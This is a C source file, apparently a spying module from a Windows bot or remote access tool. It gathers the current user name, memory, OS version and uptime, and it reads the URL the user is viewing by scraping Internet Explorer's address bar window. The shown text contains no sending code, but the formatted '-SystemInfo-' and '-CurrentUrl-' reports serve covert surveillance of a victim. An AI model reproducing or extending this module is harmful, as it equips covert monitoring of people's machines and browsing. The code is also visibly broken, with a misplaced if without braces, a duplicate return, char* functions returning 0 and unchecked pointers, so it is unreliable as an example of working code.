#include "Include.h"
#include "Hell.h"
typedef long (CALLBACK* GETRES)(int);
bool GetURLFromIE(LPTSTR lpBuffer, DWORD dwLen);
char * sysinfo(char *sinfo)
{
	int total;
	MEMORYSTATUS memstat;
	OSVERSIONINFO verinfo;
	DWORD dwLevel = 15;
    LPWKSTA_USER_INFO_1 pBuf = NULL;
    NET_API_STATUS nStatus;
    nStatus = NetWkstaUserGetInfo(NULL, dwLevel, (LPBYTE *)&pBuf);
	if (nStatus == NERR_Success)
		if (pBuf != NULL)
	GlobalMemoryStatus(&memstat); // load memory info into memstat
	verinfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFO); // required for some strange reason
	GetVersionEx(&verinfo); // load version info into verinfo
	char *os;
	char *find;
	char os2[140];
	if (verinfo.dwMajorVersion == 4 && verinfo.dwMinorVersion == 0) {
		if (verinfo.dwPlatformId == VER_PLATFORM_WIN32_WINDOWS) os = "95";
		if (verinfo.dwPlatformId == VER_PLATFORM_WIN32_NT) os = "NT";
	}
	else if (verinfo.dwMajorVersion == 4 && verinfo.dwMinorVersion == 10) os = "98";
	else if (verinfo.dwMajorVersion == 4 && verinfo.dwMinorVersion == 90) os = "ME";
	else if (verinfo.dwMajorVersion == 5 && verinfo.dwMinorVersion == 0) os = "2K";
	else if (verinfo.dwMajorVersion == 5 && verinfo.dwMinorVersion == 1) os = "XP";
	else if (verinfo.dwMajorVersion == 5 && verinfo.dwMinorVersion == 2) os = "2003";
	else if (verinfo.dwMajorVersion == 6) os = "VISTA";
	else os = "??";
	
	
	
	if (verinfo.dwPlatformId == VER_PLATFORM_WIN32_NT && verinfo.szCSDVersion[0] != '\0') {
		sprintf(os2, "%s [%s]", os, verinfo.szCSDVersion);
		os = os2;
	}
	
	
	total = GetTickCount() / 1000; // GetTickCount() / 1000 = seconds since os started.
	

	char msg[] = "";
	char msgbuf[1024];
	char tmpbuf[1024];
#define bufsize 2000
	OSVERSIONINFO osVerInfo;
	memset(&osVerInfo, 0, sizeof(OSVERSIONINFO));
	osVerInfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
	GetVersionEx(&osVerInfo);
	if(osVerInfo.dwPlatformId == VER_PLATFORM_WIN32_NT)
		
		MEMORYSTATUS memStat;
		int num = 0;
		float tot = 0.0000;
		DWORD top, bot; 
		HINSTANCE hInst = LoadLibrary("RSRC32.dll");
		GETRES pGetRes = (GETRES) GetProcAddress(hInst, "_MyGetFreeSystemResources32@4");
		long lSysRes = (*pGetRes)(0);
		int ret = 0;
		ret = (int)lSysRes;
		
	
		char szURL[255];
		GetURLFromIE(szURL, sizeof(szURL));


	sprintf(sinfo, "-SystemInfo- Current-User: %s Free System Resources: %d -CurrentUrl- User currently viewing: %s [.RAM.]: %dKB total, %dKB free [.OS.]: Windows %s (%d.%d, build %d) [.Uptime.]: %dd %dh %dm",pBuf->wkui1_username,ret,szURL,memstat.dwTotalPhys / 1024, memstat.dwAvailPhys / 1024,	os, verinfo.dwMajorVersion, verinfo.dwMinorVersion, verinfo.dwBuildNumber, total / 86400, (total % 86400) / 3600, ((total % 86400) % 3600) / 60);

	

	return sinfo;
	return sinfo; // return the sysinfo string
}




char * currentuser(char *sinfo)
{
	DWORD dwLevel = 15;
    LPWKSTA_USER_INFO_1 pBuf = NULL;
    NET_API_STATUS nStatus;
    nStatus = NetWkstaUserGetInfo(NULL, dwLevel, (LPBYTE *)&pBuf);
	if (nStatus == NERR_Success){
		if (pBuf != NULL){
			sprintf(sinfo, "-SystemInfo- Current-User: %s",pBuf->wkui1_username);
        }
    }
    else
    if (pBuf != NULL)
		NetApiBufferFree(pBuf);
	return sinfo;
}




char * freeResInt(char *sinfo)
{
	char msg[] = "";
	char msgbuf[1024];
	char tmpbuf[1024];
#define bufsize 2000
	OSVERSIONINFO osVerInfo;
	memset(&osVerInfo, 0, sizeof(OSVERSIONINFO));
	osVerInfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
	GetVersionEx(&osVerInfo);
	if(osVerInfo.dwPlatformId == VER_PLATFORM_WIN32_NT)
		
		
	{
		//NT/2000/XP
		MEMORYSTATUS memStat;
		int num = 0, ret = 0;
		float tot = 0.0000;
		DWORD top, bot; 
		GlobalMemoryStatus(&memStat);
		top = ((DWORD)memStat.dwAvailPhys + (DWORD)memStat.dwAvailVirtual + (DWORD)memStat.dwAvailPageFile);
		bot = ((DWORD)memStat.dwTotalPhys + (DWORD)memStat.dwTotalVirtual +	(DWORD)memStat.dwAvailPageFile);
		tot = (double)top / (double)bot;
		ret = (int)(tot * 100);
		sprintf(sinfo, "-SystemInfo- Could Not Get system Resources:");
	}
	else
	{
		HINSTANCE hInst = LoadLibrary("RSRC32.dll");
		GETRES pGetRes = (GETRES) GetProcAddress(hInst, "_MyGetFreeSystemResources32@4");
		long lSysRes = (*pGetRes)(0);
		int ret = 0;
		ret = (int)lSysRes;

		sprintf(sinfo, "-SystemInfo- Free System Resources: %d",ret);
	}
	return 0;
   }


bool GetURLFromIE(LPTSTR lpBuffer, DWORD dwLen) {
	HWND hwndIEFrame;
	HWND hwndWorkerA;
	HWND hwndReBarWindow32;
	HWND hwndComboBoxEx32;
	HWND hwndComboBox;
	HWND hwndEdit;
	hwndIEFrame = FindWindow("IEFrame", (LPCTSTR)NULL);
	
	
	if(hwndIEFrame != NULL) {
		hwndWorkerA = FindWindowEx(hwndIEFrame, (HWND)NULL, "WorkerA", (LPCTSTR)NULL);
		
		
		if(hwndWorkerA != NULL) {
			hwndReBarWindow32 = FindWindowEx(hwndWorkerA, (HWND)NULL, "ReBarWindow32", (LPCTSTR)NULL);
			
			
			
			if(hwndReBarWindow32 != NULL) {
				hwndComboBoxEx32 = FindWindowEx(hwndReBarWindow32, (HWND)NULL, "ComboBoxEx32", (LPCTSTR)NULL);
				
				
				if(hwndComboBoxEx32 != NULL) {
					hwndComboBox = FindWindowEx(hwndComboBoxEx32, (HWND)NULL, "ComboBox", (LPCTSTR)NULL);
					
					
					if(hwndComboBox != NULL) {
						hwndEdit = FindWindowEx(hwndComboBox, (HWND)NULL, "Edit", (LPCTSTR)NULL);
						SendMessage(hwndEdit, WM_GETTEXT, (WPARAM)dwLen, (LPARAM)lpBuffer);
						
						return TRUE;
					}
				}
			}
		}
	}
	return FALSE;
}


char * geturl(char *sinfo) {
	char szURL[255];
	GetURLFromIE(szURL, sizeof(szURL));
	sprintf(sinfo, "-CurrentUrl- User currently viewing: %s",szURL);
	return 0;
}